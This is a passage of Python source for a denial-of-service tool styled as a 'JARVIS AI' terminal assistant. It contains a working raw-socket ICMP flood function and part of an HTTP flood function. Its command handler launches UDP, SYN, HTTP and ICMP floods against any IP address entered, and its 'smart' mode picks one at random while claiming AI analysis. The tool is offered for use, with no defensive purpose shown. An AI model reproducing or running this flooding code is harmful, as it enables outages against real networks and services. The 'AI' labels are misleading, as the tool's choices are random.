            elapsed = int(time.time() - start_time)
            progress = TerminalEffects.progress_animation(elapsed, duration)
            sys.stdout.write(f"\r  ⏱ {progress}  {gradient_text(f'{elapsed}s / {duration}s', 100, 100, 100, 200, 200, 200)}")
            sys.stdout.write(f"\r  📦 {gradient_text(f'{total_requests:,}', 200, 0, 255, 255, 0, 200)} requests  ")
            if elapsed > 0:
                sys.stdout.write(f"\r  🚀 {gradient_text(f'{int(total_requests/elapsed):,}', 255, 255, 0, 255, 0, 255)} req/s  ")
            sys.stdout.flush()
            time.sleep(0.3)
        
        stop_flag = True
        print(f"\n\n{glow_text('✓ HTTP Flood completed!', 0, 255, 0)}")
        print(f"{Colors.DIM}  Total HTTP requests: {total_requests:,}{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n\n{glow_text('⚠ Attack stopped by user', 255, 255, 0)}")
        stop_flag = True
        raise
    finally:
        stop_flag = True

def send_icmp_flood(ip, duration, threads=30):
    end_time = time.time() + duration
    stop_flag = False
    total_packets = 0
    start_time = time.time()
    packet_lock = threading.Lock()
    
    def icmp_worker():
        nonlocal total_packets
        try:
            icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            local_packets = 0
            while not stop_flag and time.time() < end_time:
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                packet += random._urandom(64)
                if len(packet) % 2 == 1:
                    packet += b'\x00'
                checksum = 0
                for i in range(0, len(packet), 2):
                    if i + 1 < len(packet):
                        checksum += (packet[i] << 8) + packet[i+1]
                checksum = (checksum >> 16) + (checksum & 0xffff)
                checksum = ~checksum & 0xffff
                packet = packet[:2] + struct.pack('!H', checksum) + packet[4:]
                icmp_sock.sendto(packet, (ip, 0))
                local_packets += 1
            with packet_lock:
                total_packets += local_packets
        except:
            pass
    
    print(f"\n{gradient_text('╔' + '═' * 78 + '╗', 0, 255, 255, 255, 0, 255)}")
    print(f"{gradient_text('║', 0, 255, 255, 255, 0, 255)} {rainbow_text('📡 ICMP FLOOD ATTACK (Ping)')}{' ' * 35}{gradient_text('║', 0, 255, 255, 255, 0, 255)}")
    print(f"{gradient_text('╚' + '═' * 78 + '╝', 255, 0, 255, 0, 255, 255)}\n")
    
    print(f"{pulse_text('▶ Target:', 255, 100, 0)} {gradient_text(f'{ip}', 0, 255, 255, 255, 0, 255)}")
    print(f"{pulse_text('▶ Duration:', 255, 100, 0)} {gradient_text(f'{duration}s', 0, 255, 255, 255, 0, 255)}")
    print(f"{pulse_text('▶ Threads:', 255, 100, 0)} {gradient_text(str(threads), 0, 255, 255, 255, 0, 255)}")
    print(f"{pulse_text('▶ Status:', 255, 100, 0)} {glow_text('● Active', 0, 255, 0)}\n")
    
    for _ in range(threads):
        thread = threading.Thread(target=icmp_worker)
        thread.daemon = True
        thread.start()
    
    try:
        while time.time() < end_time:
            elapsed = int(time.time() - start_time)
            progress = TerminalEffects.progress_animation(elapsed, duration)
            sys.stdout.write(f"\r  ⏱ {progress}  {gradient_text(f'{elapsed}s / {duration}s', 100, 100, 100, 200, 200, 200)}")
            sys.stdout.write(f"\r  📦 {gradient_text(f'{total_packets:,}', 0, 255, 255, 255, 0, 255)} ICMP packets  ")
            if elapsed > 0:
                sys.stdout.write(f"\r  🚀 {gradient_text(f'{int(total_packets/elapsed):,}', 255, 255, 0, 255, 0, 255)} p/s  ")
            sys.stdout.flush()
            time.sleep(0.3)
        
        stop_flag = True
        print(f"\n\n{glow_text('✓ ICMP Flood completed!', 0, 255, 0)}")
        print(f"{Colors.DIM}  Total ICMP packets: {total_packets:,}{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n\n{glow_text('⚠ Attack stopped by user', 255, 255, 0)}")
        stop_flag = True
        raise
    finally:
        stop_flag = True

# ----- MAIN JARVIS CLASS -----
class JarvisAI:
    def __init__(self):
        self.ai_core = JARVISAICore()
        self.config = Config.load()
        self.start_time = datetime.now()
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.attack_history = []
        self.running = True
        
        self.ai_core.personality = self.config.get("personality", "professional")
        self.ai_core.config = self.config
        
    def process_command(self, command: str) -> str:
        cmd_lower = command.lower().strip()
        
        if cmd_lower in ["help", "h", "?"]:
            return self.ai_core.get_help()
        
        if cmd_lower in ["clear", "cls"]:
            TerminalEffects.clear()
            return "✨ Screen cleared."
        
        if cmd_lower in ["exit", "quit", "bye", "goodbye"]:
            self.running = False
            return "🖖 Shutting down JARVIS. Goodbye, sir!"
        
        if cmd_lower in ["status", "stats", "info"]:
            status = self.ai_core.get_status()
            return f"""
{gradient_text('╔' + '═' * 78 + '╗', 0, 150, 255, 150, 0, 255)}
{gradient_text('║', 0, 150, 255, 150, 0, 255)} {rainbow_text('📊 SYSTEM STATUS')}{' ' * 53}{gradient_text('║', 0, 150, 255, 150, 0, 255)}
{gradient_text('╚' + '═' * 78 + '╝', 150, 0, 255, 0, 150, 255)}

{pulse_text('▶ AI Core:', 255, 100, 0)} {gradient_text(f"{status['name']} v{status['version']}", 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Personality:', 255, 100, 0)} {gradient_text(status['personality'].capitalize(), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Mood:', 255, 100, 0)} {gradient_text(status['mood'].capitalize(), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Energy:', 255, 100, 0)} {gradient_text(f"{status['energy']:.0f}%", 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Patterns Learned:', 255, 100, 0)} {gradient_text(str(status['patterns']), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Memories:', 255, 100, 0)} {gradient_text(str(status['memories']), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Accuracy:', 255, 100, 0)} {gradient_text(f"{status['metrics']['accuracy']*100:.1f}%", 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Interactions:', 255, 100, 0)} {gradient_text(str(status['metrics']['interactions']), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Attacks Executed:', 255, 100, 0)} {gradient_text(str(status['metrics']['attacks_executed']), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Uptime:', 255, 100, 0)} {gradient_text(self.get_uptime(), 0, 255, 255, 255, 0, 255)}
{pulse_text('▶ Session ID:', 255, 100, 0)} {gradient_text(self.session_id, 0, 255, 255, 255, 0, 255)}"""
        
        attack_match = re.match(r'^(?:attack|udp)\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\d+)(?:\s+(\d+))?', cmd_lower)
        if attack_match:
            ip = attack_match.group(1)
            port = int(attack_match.group(2))
            duration = int(attack_match.group(3))
            threads = int(attack_match.group(4)) if attack_match.group(4) else 50
            
            self.ai_core.system_metrics["attacks_executed"] += 1
            self.attack_history.append({
                "type": "UDP Flood",
                "target": f"{ip}:{port}",
                "duration": duration,
                "threads": threads,
                "timestamp": datetime.now().isoformat()
            })
            
            TerminalEffects.crazy_loading(f"🔥 Preparing UDP flood on {ip}:{port}", 1.5)
            send_udp_flood_enhanced(ip, port, duration, threads)
            return "✓ Attack completed."
        
        syn_match = re.match(r'^syn\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\d+)(?:\s+(\d+))?', cmd_lower)
        if syn_match:
            ip = syn_match.group(1)
            port = int(syn_match.group(2))
            duration = int(syn_match.group(3))
            threads = int(syn_match.group(4)) if syn_match.group(4) else 50
            
            self.ai_core.system_metrics["attacks_executed"] += 1
            TerminalEffects.crazy_loading(f"⚡ Preparing SYN flood on {ip}:{port}", 1.5)
            send_syn_flood(ip, port, duration, threads)
            return "✓ Attack completed."
        
        http_match = re.match(r'^http\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\d+)(?:\s+(\d+))?', cmd_lower)
        if http_match:
            ip = http_match.group(1)
            port = int(http_match.group(2))
            duration = int(http_match.group(3))
            threads = int(http_match.group(4)) if http_match.group(4) else 20
            
            self.ai_core.system_metrics["attacks_executed"] += 1
            TerminalEffects.crazy_loading(f"🌐 Preparing HTTP flood on {ip}:{port}", 1.5)
            send_http_flood(ip, port, duration, threads)
            return "✓ Attack completed."
        
        icmp_match = re.match(r'^icmp\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)(?:\s+(\d+))?', cmd_lower)
        if icmp_match:
            ip = icmp_match.group(1)
            duration = int(icmp_match.group(2))
            threads = int(icmp_match.group(3)) if icmp_match.group(3) else 30
            
            self.ai_core.system_metrics["attacks_executed"] += 1
            TerminalEffects.crazy_loading(f"📡 Preparing ICMP flood on {ip}", 1.5)
            send_icmp_flood(ip, duration, threads)
            return "✓ Attack completed."
        
        smart_match = re.match(r'^smart\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)', cmd_lower)
        if smart_match:
            ip = smart_match.group(1)
            duration = int(smart_match.group(2))
            
            TerminalEffects.crazy_loading(f"🧠 AI analyzing target {ip}", 2)
            attack_type = random.choice(["udp", "syn", "http", "icmp"])
            
            if attack_type == "udp":
                port = random.choice([80, 443, 8080, 53, 22, 21])
                threads = random.randint(50, 150)
                TerminalEffects.type_effect(f"✓ AI selected UDP Flood on port {port} with {threads} threads", 0.01)
                send_udp_flood_enhanced(ip, port, duration, threads)
            elif attack_type == "syn":
                port = random.choice([80, 443, 22, 21])
                threads = random.randint(30, 100)
                TerminalEffects.type_effect(f"✓ AI selected SYN Flood on port {port} with {threads} threads", 0.01)
                send_syn_flood(ip, port, duration, threads)
            elif attack_type == "http":
                port = 80
                threads = random.randint(10, 30)
                TerminalEffects.type_effect(f"✓ AI selected HTTP Flood on port {port} with {threads} threads", 0.01)
                send_http_flood(ip, port, duration, threads)
            else:
                threads = random.randint(20, 50)
                TerminalEffects.type_effect(f"✓ AI selected ICMP Flood with {threads} threads", 0.01)
                send_icmp_flood(ip, duration, threads)
            
            return "✓ Smart attack completed."
        
        if cmd_lower.startswith("teach "):
            return self.ai_core.handle_learning(command)
        
        if cmd_lower.startswith("personality "):
            personality = cmd_lower.replace("personality ", "").strip()
            if personality in ["professional", "casual", "humorous", "aggressive"]:
                self.config["personality"] = personality
                self.ai_core.personality = personality
                Config.save(self.config)
                return f"✓ Personality changed to: {personality.capitalize()}"
            else:
                return "Available personalities: professional, casual, humorous, aggressive"
        
        if cmd_lower in ["history", "attacks"]:
            if not self.attack_history:
                return "No attacks executed in this session."
            result = f"\n{gradient_text('┌' + '─' * 76 + '┐', 0, 150, 255, 150, 0, 255)}\n"
            result += f"{gradient_text('│', 0, 150, 255, 150, 0, 255)} {rainbow_text('ATTACK HISTORY')}{' ' * 55}{gradient_text('│', 0, 150, 255, 150, 0, 255)}\n"
            result += f"{gradient_text('├' + '─' * 76 + '┤', 150, 0, 255, 0, 150, 255)}\n"
            for i, attack in enumerate(self.attack_history[-10:], 1):
                result += f"{gradient_text('│', 0, 150, 255, 150, 0, 255)} {i}. {attack['type']} → {attack['target']} ({attack['duration']}s) {Colors.DIM}{attack['timestamp'][:19]}{Colors.END}{' ' * (76 - len(f'{i}. {attack["type"]} → {attack["target"]} ({attack["duration"]}s) '))}{gradient_text('│', 0, 150, 255, 150, 0, 255)}\n"
            result += f"{gradient_text('└' + '─' * 76 + '┘', 150, 0, 255, 0, 150, 255)}"
            return result
        
        return self.ai_core.process_input(command)["response"]
    
    def get_uptime(self):
        delta = datetime.now() - self.start_time
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours}h {minutes}m {seconds}s"
    
    def run(self):
        TerminalEffects.clear()
        
        # Show matrix rain effect
        TerminalEffects.matrix_rain(2)
        
        # Welcome banner with crazy effects
        print(f"{gradient_text('╔' + '═' * 78 + '╗', 0, 150, 255, 150, 0, 255)}")
        
        # Animated banner lines with different gradients
        banner_lines = [
            '  ██╗ █████╗ ██████╗ ██╗   ██╗██╗███████╗  ',
            '  ██║██╔══██╗██╔══██╗██║   ██║██║██╔════╝  ',
            '  ██║███████║██████╔╝╚██╗ ██╔╝██║███████╗  ',
            '  ██║██╔══██║██╔══██╗ ╚████╔╝ ██║╚════██║  ',
            '  ██║██║  ██║██║  ██║  ╚██╔╝  ██║███████║  ',
            '  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝  '
        ]
        
        for line in banner_lines:
            # Each line gets a different gradient
            start_r = random.randint(0, 255)
            start_g = random.randint(0, 255)
            start_b = random.randint(0, 255)
            end_r = random.randint(0, 255)
            end_g = random.randint(0, 255)
            end_b = random.randint(0, 255)
            print(f"{gradient_text('║', 0, 150, 255, 150, 0, 255)} {gradient_text(line, start_r, start_g, start_b, end_r, end_g, end_b)}{gradient_text('║', 0, 150, 255, 150, 0, 255)}")
            time.sleep(0.05)
        
        print(f"{gradient_text('╠' + '═' * 78 + '╣', 0, 150, 255, 150, 0, 255)}")
        
        # Status line with rainbow text
        status_text = f"{' ' * 28}⚡ JARVIS AI v4.0 ⚡{' ' * 28}"
        print(f"{gradient_text('║', 0, 150, 255, 150, 0, 255)} {rainbow_text(status_text)}{gradient_text('║', 0, 150, 255, 150, 0, 255)}")
        
        print(f"{gradient_text('╚' + '═' * 78 + '╝', 150, 0, 255, 0, 150, 255)}\n")
        
        # Fire effect for initialization
        TerminalEffects.fire_effect("🔥 Initializing Neural Network...", 1)
        time.sleep(0.2)
        TerminalEffects.fire_effect("📡 Establishing Network Interface...", 1)
        time.sleep(0.2)
        TerminalEffects.fire_effect("🤖 Loading AI Core...", 1)
        time.sleep(0.2)
        
        print(f"\n{glow_text('✓ JARVIS AI Online', 0, 255, 0)}")
        print(f"{gradient_text(f'  Session: {self.session_id}', 100, 100, 100, 200, 200, 200)}")
        print(f"{gradient_text('  Type help for commands, clear to clear screen', 100, 100, 100, 200, 200, 200)}\n")
        
        status = self.ai_core.get_status()
        status_line = f"▶ {status['name']} v{status['version']} | {status['personality'].capitalize()} Mode | {status['energy']:.0f}% Energy"
        print(f"{gradient_text(status_line, 0, 255, 150, 0, 255, 255)}\n")
        
        # Main loop
        while self.running:
            try:
                # Create prompt with gradient
                prompt = f"{gradient_text('┌─', 0, 150, 255, 150, 0, 255)}{pulse_text('JARVIS', 255, 215, 0)}{gradient_text('─▶ ', 150, 0, 255, 0, 150, 255)}"
                sys.stdout.write(prompt)
                user_input = input()
                
                if not user_input.strip():
                    continue
                
                response = self.process_command(user_input)
                
                if response:
                    if not response.startswith("\n") and not response.startswith("✓"):
                        print(f"\n{gradient_text('▶', 0, 255, 150, 0, 255, 255)} {response}")
                    else:
                        print(response)
                
                print()
                
            except KeyboardInterrupt:
                print(f"\n\n{glow_text('⚠ Interrupted. Type exit to quit.', 255, 255, 0)}\n")
            except Exception as e:
                print(f"\n{glow_text(f'✗ Error: {e}', 255, 0, 0)}\n")

# ----- MAIN -----
def main():
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        test_sock.close()
    except PermissionError:
        TerminalEffects.clear()
        print(f"{gradient_text('╔' + '═' * 78 + '╗', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {glow_text('⚠️  PERMISSION WARNING', 255, 255, 0)}{' ' * 53}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║' + '═' * 78 + '║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {Colors.DIM}Running without administrator/root privileges!{Colors.END}{' ' * 30}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {Colors.DIM}Some features may not work properly.{Colors.END}{' ' * 35}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {Colors.DIM}Please run as:{Colors.END}{' ' * 58}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {Colors.DIM}• Windows: Right-click → Run as Administrator{Colors.END}{' ' * 26}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {Colors.DIM}• Linux/Mac: sudo python3 {sys.argv[0]}{Colors.END}{' ' * 31}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
        print(f"{gradient_text('╚' + '═' * 78 + '╝', 255, 0, 150, 255, 150, 0)}\n")
        input(f"{Colors.DIM}Press Enter to continue...{Colors.END}")
    except:
        pass
    
    jarvis = JarvisAI()
    jarvis.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{glow_text('⚠️  Program terminated by user', 255, 255, 0)}")
        print(f"{gradient_text('JARVIS signing off...', 150, 0, 255, 0, 150, 255)}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{glow_text(f'✗ Fatal error: {e}', 255, 0, 0)}")
        sys.exit(1)